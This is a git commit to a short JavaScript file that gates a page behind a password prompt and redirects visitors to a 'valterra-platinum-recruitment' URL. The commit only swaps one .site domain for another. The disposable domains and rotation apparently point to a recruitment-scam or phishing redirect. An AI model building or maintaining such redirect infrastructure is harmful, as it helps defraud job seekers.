4bb9be559c9b06ba6977009fdab378d2c3de60fc
Usorondo89 <floral-biofuel-77@icloud.com>
2026-07-11 15:46:14 +0100

    Update valterra.js

--- valterra.js
+++ valterra.js
@@ -4,5 +4,5 @@ password = prompt(
   'APPLY'
 );
 if (password != 'APPLY') {
-  location.href = 'https://www.ndemuuyo.site/valterra-platinum-recruitment';
+  location.href = 'https://www.basinofitid.site/valterra-platinum-recruitment';
 }
